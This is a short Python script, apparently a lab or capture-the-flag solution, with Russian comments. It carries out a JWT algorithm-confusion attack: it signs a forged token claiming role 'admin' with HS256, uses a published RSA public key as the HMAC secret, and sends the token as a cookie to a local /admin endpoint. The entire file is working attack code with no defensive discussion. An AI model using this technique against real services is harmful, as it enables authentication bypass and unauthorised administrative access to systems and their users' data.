import requests
import hmac
import hashlib
import base64
import json
from bs4 import BeautifulSoup

# Не PyJWT, потому что оно работает плохо

# URL сервиса
base_url = "http://localhost:5000"

# Ключ из документации
pub_key = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0x3zwwhYsuA11bqOjek+
SLn4JUK8mDxHdEvOp5VeGe6u1pN5tQZI5hbSjHQ1L4oblrAwZP5FFxDPmhR91/3+
J8b4GhZ/BMwVvxdXkdGlXR8qQYg1JHRweYFgXrkLt/vwwGyyd7TQm1YnpZfkOaXO
bCzhg6xrsqE7qodQRz75mX3E0WBBMSunZbGOsDhGD5Ic7h6olul8IDxGtTtXnTBr
4SE9cDLOQYHEWvNTEe3HD/BYYLTZXJCah2aTLFiXv9+Mn6gvD8RZc8dOUUaTZY+K
ectRi61uSAdwiO1PNawvJiGblrx1+DIqIKZ7qae4NVKCUA3xmHG1RFRPvPmQQ6Lo
WwIDAQAB
-----END PUBLIC KEY-----
'''

header = json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":"))
payload = json.dumps({"user": "user", "role": "admin"}, separators=(",", ":"))

encoded_header = base64.urlsafe_b64encode(header.encode()).decode().rstrip("=")
encoded_payload = base64.urlsafe_b64encode(payload.encode()).decode().rstrip("=")

signing_input = f"{encoded_header}.{encoded_payload}".encode()
signature = hmac.new(pub_key.encode(), signing_input, hashlib.sha256)
encoded_signature = base64.urlsafe_b64encode(signature.digest()).decode().rstrip("=")

jwt_token = f"{encoded_header}.{encoded_payload}.{encoded_signature}"
print('JWT: ', jwt_token)

response = requests.get(
    f"{base_url}/admin",
    cookies={"auth_token": jwt_token}
)

print("Status Code:", response.status_code)
print("Response:", response.text)
